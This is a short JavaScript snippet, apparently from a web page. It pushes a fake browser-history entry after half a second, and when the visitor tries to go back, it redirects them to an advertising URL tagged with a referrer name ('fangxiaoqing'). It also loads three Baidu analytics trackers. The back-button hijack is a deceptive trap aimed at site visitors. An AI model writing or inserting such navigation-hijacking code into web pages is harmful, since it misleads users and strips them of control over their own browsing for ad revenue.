window.onhashchange = function() {
            jp();
        };

        function hh1() {
            history.pushState(history.length + 1, "message", "#" + new Date().getTime());
        }

        function jp() {
            fh();
        }
        setTimeout('hh1();', 500);

        function fh() {
            let person = 'fangxiaoqing';
            location.href = Ads+'&_p='+person;
        }
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?254237c13bc6f18244ddb0127eaa0658";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?362571d334dfe4bbda42380c64db58ac";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.async = true;
            hm.src = "https://hm.baidu.com/hm.js?b521817f22507716e364b3fe28644f8b";
            var ts = document.getElementsByTagName("script")[1]; 
            ts.parentNode.insertBefore(hm, ts);
        })();